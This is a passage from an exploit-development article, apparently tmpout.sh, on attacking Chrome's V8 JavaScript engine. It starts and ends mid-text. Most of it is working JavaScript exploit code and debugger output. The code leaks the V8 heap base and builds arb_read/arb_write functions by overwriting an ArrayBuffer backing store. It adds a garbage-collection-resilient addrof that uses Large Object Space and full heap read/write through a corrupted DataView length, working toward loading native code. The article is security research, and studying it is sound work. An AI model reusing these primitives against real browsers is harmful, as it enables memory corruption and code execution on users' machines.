</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">embedder</span> <span style="color:#a6e22e">fields</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">aligned</span> <span style="color:#a6e22e">pointer</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">nil</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">aligned</span> <span style="color:#a6e22e">pointer</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">nil</span>)
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x3fee082804e1</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">Map</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JS_TYPED_ARRAY_TYPE</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">instance</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">68</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">inobject</span> <span style="color:#a6e22e">properties</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">elements</span> <span style="color:#a6e22e">kind</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">UINT8ELEMENTS</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">unused</span> <span style="color:#a6e22e">property</span> <span style="color:#a6e22e">fields</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">invalid</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">stable_map</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">back</span> <span style="color:#a6e22e">pointer</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee0804030d</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">undefined</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">prototype_validity</span> <span style="color:#a6e22e">cell</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee081c0451</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Cell</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">instance</span> <span style="color:#a6e22e">descriptors</span> (<span style="color:#a6e22e">own</span>) <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee080401b5</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">DescriptorArray</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">prototype</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee082429b9</span> <span style="color:#f92672">&lt;</span>Object <span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3fee08280509</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">constructor</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee08242939</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSFunction</span> <span style="color:#a6e22e">Uint8Array</span> (<span style="color:#a6e22e">sfi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3fee081c65c1</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">dependent</span> <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee080401ed</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Other</span> <span style="color:#a6e22e">heap</span> <span style="color:#a6e22e">object</span> (<span style="color:#a6e22e">WEAK_FIXED_ARRAY_TYPE</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">construction</span> <span style="color:#a6e22e">counter</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span></span></span></code></pre></div>
The value of <code>data_ptr</code>is the result of the addition of <code>base_pointer</code> and <code>external_pointer</code> and the value of <code>external_pointer</code> is ultimately the value we want. If we apply a binary mask to negate the value of the last byte of <code>external_pointer</code>, we will retrieve the value of <code>isolate root</code>&ndash; V8&rsquo;s heap base:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">root_isolate_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">e</span>)) <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>));
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">root_isolate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">weak_read</span>(<span style="color:#a6e22e">root_isolate_addr</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(<span style="color:#ae81ff">0xff</span><span style="color:#a6e22e">n</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">bff</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">bff</span>);  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">buf_addr</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">len</span>, <span style="color:#a6e22e">boxed</span><span style="color:#f92672">=</span><span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">boxed</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">root_isolate</span>) <span style="color:#f92672">|</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">weak_write</span>(<span style="color:#a6e22e">backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">bff</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">getUint8</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">getUint16</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">getUint32</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">getBigUint64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">val</span>, <span style="color:#a6e22e">len</span>, <span style="color:#a6e22e">boxed</span><span style="color:#f92672">=</span><span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">boxed</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">root_isolate</span>) <span style="color:#f92672">|</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">weak_write</span>(<span style="color:#a6e22e">backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">bff</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setUint8</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">val</span>, <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setUint16</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">val</span>, <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setUint32</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">val</span>, <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">val</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<!-- raw HTML omitted --></p>
<hr>
<h2 id="achieving-stable-arbitrary-readwrite">Achieving Stable Arbitrary Read/Write<a href="#achieving-stable-arbitrary-readwrite" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Browsers heavily rely on features such as Garbage Collection in order to autonomously free orphan objects (objects that are not being referenced by any other object).</p>
<p>However, we will soon cover how this introduces reliability issues in our exploit.
This paper will not be covering V8 Garbage Collection internals extensively as it is a broad subject, but I highly encourage reading <a href="https://v8.dev/blog/trash-talk">this</a> reference of Orinoco (V8 GC) and <a href="https://deepu.tech/memory-management-in-v8/">this</a> on V8 memory management as an initial introduction to the subject.</p>
<p>In summary, the V8 heap is split into generations, and objects are moved through these generations if they survive a GC:</p>
<p><img src="https://v8.dev/_img/trash-talk/02.svg#center" alt=""></p>
<p>In order to showcase an example of reliability problems introduced by the garbage collector, lets showcase Orinoco&rsquo;s Minor GC, also known as Scavenge which is in charge of garbage-collecting the Young generation. When this GC takes place, live objects get moved from <code>from-space</code> to <code>to-space</code> within V8&rsquo;s Young Generation heap:</p>
<p><img src="https://tmpout.sh/2/img/2022-02-16_22-27.png#center" alt=""></p>
<p>In order to illustrate this, let&rsquo;s run the following script:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">force_gc</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x80000</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">oob</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.1</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> [{}, {}];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">b</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">c</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">d</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] Forcing GC...&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">force_gc</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">b</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">c</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">d</span>);</span></span></code></pre></div>
If we see the output of this script, we will see the following:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ae81ff">0x350808087859</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">1073741820</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x350808087889</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x3508080878e1</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Forcing</span> <span style="color:#a6e22e">GC</span>...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x3508083826e5</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">1073741820</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x3508083826f5</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x350808382705</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&gt;</span></span></span></code></pre></div>
As we can notice, the addresses of all the objects have changed after the first <code>Scavenge</code> GC, as they were evacuated to <code>to-space</code> young generation region. This entails that if objects change in location, the memory layout that our exploitation primitives are built on top of will also change, and consequently our exploit primitives break.</p>
<p>This specifically impacts primitives build on top of OOB reads and writes, as these will be misplaced by reading <code>to-space</code> memory rather than <code>from-space</code> memory, having little control over the layout of live objects in this new memory region, and even if we do, remaining live objects will eventually be promoted to <code>Old Space</code>.</p>
<p>This is important to understand, because our <code>addrof</code> primitive relies on OOB reads and writes, as well as our <code>arb_read</code> and <code>arb_write</code> primitives, which are bound to our <code>weak_write</code> primitive that is prone to the same problem.</p>
<p>There are likely several solutions to circumvent this problem. It is technically possible to craft our exploitation primitives after the promotion of dedicated objects to <code>Old Space</code>. However, there is always a possibility of an <code>Evacuation GC</code> to be triggered on a Major GC, which will provoke objects from <code>Old Space</code> to be rearranged for sake of memory defragmentation.</p>
<p>Although Major GCs are not triggered that often, and <code>Old Space</code> region has to be fragmented from objects to be rearranged, leveraging objects in <code>Old Space</code> may not be a long-term realiable solution.</p>
<p>Another approach is to use objects placed within <code>Large Object Space</code> region since these objects will not be garbage collected.
I first saw this technique while reading Brendon Tiszka&rsquo;s awesome <a href="https://tiszka.com/blog/CVE_2021_21225_exploit.html">post</a>, in which he points out that if an object size exceeds the constant <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/common/globals.h;l=360;drc=64556d13a49f535430733d86bc5a6a0f36ae7d56">kMaxRegularHeapObjectSize</a> (defined as <code>1048576</code>) that object will be placed in <code>Large Object Space</code>.</p>
<p>Following this premise, we can construct an <code>addrof</code> primitive resilient to garbage collection:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">/// constructing stable addrof
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">lo_array_obj</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#ae81ff">1048577</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">elements_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">weak_read</span>(<span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">lo_array_obj</span>)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>));
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">elements_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">elements_ptr</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">leak_array_buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dd</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">leak_array_buffer</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">leak_array_buffer_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">leak_array_buffer</span>))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">backing_store_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">leak_array_buffer_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">elements_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">root_isolate</span>) <span style="color:#f92672">|</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">elements_ptr</span>) <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">weak_write</span>(<span style="color:#a6e22e">backing_store_ptr</span>, <span style="color:#a6e22e">elements_ptr</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">stable_addrof</span>(<span style="color:#a6e22e">obj</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lo_array_obj</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">dd</span>.<span style="color:#a6e22e">getUint32</span>(<span style="color:#ae81ff">0x8</span>, <span style="color:#66d9ef">true</span>)));
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
In order to create a set of stable arbitrary read/write primitives, we have to build these primitives without relying on V8 objects that will be garbage collected.</p>
<p>In order to achiveve this, we can overwrite the <code>backing store</code> of an <code>ArrayBuffer</code> with an arbitrary unboxed pointer that is not held within the V8 heap.</p>
<p>This limits us to use any address residing within V8&rsquo;s heap. Ironically, a neat way to gain arbitrary read/write to any arbitrary address on the V8 heap using this technique (as showcased by the exploit in Brendon&rsquo;s post) is by leveraging our previously leaked <code>root_isolate</code> as the ArrayBuffer&rsquo;s <code>backing store</code> value. This address denoting the V8 heap base won&rsquo;t change for the lifetime of the current process. Modifying the bound <code>DataView</code> object length will also enable using the V8 compressed untagged pointers as offsets:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// constructing stable read/write for v8 heap
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">heap</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">heap_accesor</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">heap</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">heap_addr_backing_store</span> <span style="color:#f92672">=</span>  <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">stable_addrof</span>(<span style="color:#a6e22e">heap</span>)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">heap_accesor_length</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">stable_addrof</span>(<span style="color:#a6e22e">heap_accesor</span>)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// overwritting ArrayBuffer backing store
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">weak_write</span>(<span style="color:#a6e22e">heap_addr_backing_store</span>, <span style="color:#a6e22e">root_isolate</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">// overwritting Dataview length
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">weak_write</span>(<span style="color:#a6e22e">heap_accesor_length</span>, <span style="color:#ae81ff">0xffffffff</span>);</span></span></code></pre></div>
We will be using this technique in order to build accessors to distinct memory regions outside of V8 heap moving forward.</p>
<!-- raw HTML omitted -->
<hr>
<h2 id="obtaining-relevant-leaks">Obtaining relevant leaks<a href="#obtaining-relevant-leaks" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Now that we have the capability to read and write arbitrary memory in a stable manner, we now have to locate specific memory regions that we will need to access in order to craft our SHELF loader.</p>
<p>The following diagram illustrates the pointer relationships of the different memory regions we are interested in:</p>
<p><img src="https://tmpout.sh/2/img/2022-02-16_23-09_1.png#center" alt=""></p>
<h3 id="leaking-chrome-base">Leaking Chrome base<a href="#leaking-chrome-base" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Leaking chrome&rsquo;s base is relatively simple and can be illustrated in the following code snippet:</p>
